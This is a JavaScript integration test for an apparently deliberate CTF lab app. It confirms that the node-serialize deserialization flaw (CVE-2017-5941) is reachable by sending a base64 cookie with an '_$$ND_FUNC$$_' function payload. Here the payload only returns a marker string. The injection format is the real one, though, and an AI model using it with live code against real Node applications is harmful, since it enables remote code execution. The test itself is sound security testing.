// Integration test for the CVE-2017-5941 deserialization path WITHOUT firing
// any host-level primitives. The payload here is a function literal that
// returns a static marker string -- it proves node-serialize reconstructs
// and invokes the function during /home rendering (the vulnerable parser
// path) without spawning processes, reading filesystem, or touching network.
//
// Real RCE primitives (require('fs'), require('child_process')) belong only
// in the e2e suite (CTFs/e2e/ctf7_exploit.py).

const request = require('supertest');

process.env.NODE_ENV = 'test';
const app = require('../../src/app');

const INERT_MARKER = 'INERT_PARSER_REACHED_OK';

function makeInertExploitCookie() {
  const payload = {
    username: `_$$ND_FUNC$$_function(){return '${INERT_MARKER}'}()`,
    theme: 'light',
    lastVisit: new Date().toISOString(),
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
}

describe('CTF7 integration: vulnerable deserializer path is reached safely', () => {
  test('/home with an inert _$$ND_FUNC$$_ payload renders the marker without spawning', async () => {
    const cookie = makeInertExploitCookie();

    const home = await request(app).get('/home').set('Cookie', `profile=${cookie}`);
    expect(home.status).toBe(200);
    expect(home.text).toContain(INERT_MARKER);

    const debug = await request(app).get('/debug').set('Cookie', `profile=${cookie}`);
    expect(debug.status).toBe(200);
    expect(debug.body.profile.username).toBe(INERT_MARKER);
  });

  test('/home then /note/3 both authorise the same inert exploit cookie (no redirect)', async () => {
    const cookie = makeInertExploitCookie();

    const home = await request(app).get('/home').set('Cookie', `profile=${cookie}`);
    expect(home.status).toBe(200);
    expect(home.text).toContain(INERT_MARKER);

    const note = await request(app)
      .get('/note/3')
      .set('Cookie', `profile=${cookie}`)
      .redirects(0);
    expect(note.status).toBe(200);
    expect(note.text).toContain('Internal Reminder');
  });
});
